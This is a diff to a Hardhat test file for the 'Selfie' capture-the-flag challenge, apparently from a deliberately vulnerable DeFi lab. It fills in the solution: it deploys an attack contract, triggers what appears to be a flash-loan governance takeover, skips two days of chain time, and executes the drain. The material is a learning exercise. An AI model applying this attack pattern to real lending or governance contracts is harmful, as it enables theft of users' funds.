@@ -1,10 +1,11 @@
-const { ethers } = require('hardhat');
+const { ethers } = require('hardhat'); 
 const { expect } = require('chai');
 const { time } = require("@nomicfoundation/hardhat-network-helpers");
 
 describe('[Challenge] Selfie', function () {
     let deployer, player;
     let token, governance, pool;
+    let attack;
 
     const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
     const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
@@ -38,7 +39,11 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const AttackFactory = await ethers.getContractFactory('AttackS', deployer);
+        attack = await AttackFactory.deploy(player.address,token.address,pool.address,governance.address);
+        await attack.kekFL(); 
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+        await attack.kekeA();      
     });
 
     after(async function () {
